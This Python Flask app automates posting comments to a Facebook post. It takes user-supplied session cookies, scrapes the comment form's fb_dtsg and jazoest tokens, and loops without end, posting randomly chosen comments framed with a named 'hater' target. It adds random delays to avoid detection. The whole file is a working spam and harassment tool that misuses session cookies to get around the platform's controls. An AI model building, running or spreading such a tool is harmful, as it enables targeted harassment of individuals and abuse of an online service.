from flask import Flask, render_template, request, jsonify
import requests
import re
import time
import threading
import random
import string
import json
from datetime import datetime

app = Flask(__name__)

active_tasks = {}
task_lock = threading.Lock()

class FacebookCommenter:
    def __init__(self, task_id):
        self.task_id = task_id
        self.comment_count = 0
        self.start_time = datetime.now()
        self.is_running = True
        self.last_status = "Initializing"
        
    def stop_task(self):
        self.is_running = False
        
    def get_status(self):
        return {
            "status": "running" if self.is_running else "stopped",
            "comment_count": self.comment_count,
            "uptime": str(datetime.now() - self.start_time),
            "last_status": self.last_status
        }
    
    def verify_cookies(self, cookies_json):
        """Verify JSON cookies with m.facebook.com"""
        try:
            cookies = json.loads(cookies_json)
            sess = requests.Session()
            sess.cookies.update(cookies)
            sess.headers.update({
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
            })
            
            resp = sess.get(
                "https://m.facebook.com/home.php", 
                timeout=10,
                allow_redirects=False
            )
            return resp.status_code == 200 and 'c_user' in sess.cookies.get_dict()
        except:
            return False

    def send_comment(self, cookies_json, post_url, comment_text, hater_name, last_name):
        try:
            cookies = json.loads(cookies_json)
            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
                "Origin": "https://m.facebook.com"
            })

            # Extract post ID
            post_id = re.search(r'/(\d+)/?$', post_url.split('?')[0]).group(1)
            
            # Load post page
            response = session.get(f"https://m.facebook.com/{post_id}")
            
            # Extract comment form parameters
            fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
            jazoest = re.search('name="jazoest" value="([^"]+)"', response.text)
            
            if not fb_dtsg or not jazoest:
                self.last_status = "Could not find comment form"
                return False

            # Submit comment
            formatted_comment = f"{hater_name} {comment_text.strip()} {last_name}"
            response = session.post(
                "https://m.facebook.com/a/comment.php",
                data={
                    "fb_dtsg": fb_dtsg.group(1),
                    "jazoest": jazoest.group(1),
                    "comment_text": formatted_comment
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )

            if response.status_code == 200:
                self.comment_count += 1
                self.last_status = f"Posted: {formatted_comment}"
                return True
            self.last_status = f"Failed (Status: {response.status_code})"
            return False

        except Exception as e:
            self.last_status = f"Error: {str(e)}"
            return False

    def run_task(self, config):
        try:
            while self.is_running:
                self.send_comment(
                    config['cookies'],
                    config['post_url'],
                    random.choice(config['comments']),
                    config['hater_name'],
                    config['last_name']
                )
                time.sleep(config['delay'] + random.uniform(1, 3))
        except Exception as e:
            self.last_status = f"Task Error: {str(e)}"
        finally:
            with task_lock:
                if self.task_id in active_tasks:
                    del active_tasks[self.task_id]

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        data = request.get_json()
        
        # Validate
        required = ['cookies', 'post_url', 'hater_name', 'last_name', 'comments', 'delay']
        if not all(data.get(field) for field in required):
            return jsonify({'status': 'error', 'message': 'All fields required'}), 400
        
        # Verify cookies
        try:
            json.loads(data['cookies'])  # Validate JSON format
        except:
            return jsonify({'status': 'error', 'message': 'Invalid JSON cookies'}), 400
            
        commenter = FacebookCommenter('verify')
        if not commenter.verify_cookies(data['cookies']):
            return jsonify({'status': 'error', 'message': 'Invalid cookies'}), 401
        
        # Start task
        task_id = ''.join(random.choices(string.digits, k=8))
        config = {
            'cookies': data['cookies'],
            'post_url': data['post_url'],
            'hater_name': data['hater_name'],
            'last_name': data['last_name'],
            'comments': [c.strip() for c in data['comments'].split('\n') if c.strip()],
            'delay': max(5, int(data['delay']))
        }
        
        commenter = FacebookCommenter(task_id)
        thread = threading.Thread(target=commenter.run_task, args=(config,))
        thread.daemon = True
        thread.start()
        
        with task_lock:
            active_tasks[task_id] = commenter
        
        return jsonify({
            'status': 'success',
            'task_id': task_id,
            'message': 'Task started'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/stop_task/<task_id>', methods=['POST'])
def stop_task(task_id):
    with task_lock:
        if task_id in active_tasks:
            active_tasks[task_id].stop_task()
            return jsonify({'status': 'success', 'message': 'Task stopped'})
        return jsonify({'status': 'error', 'message': 'Task not found'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
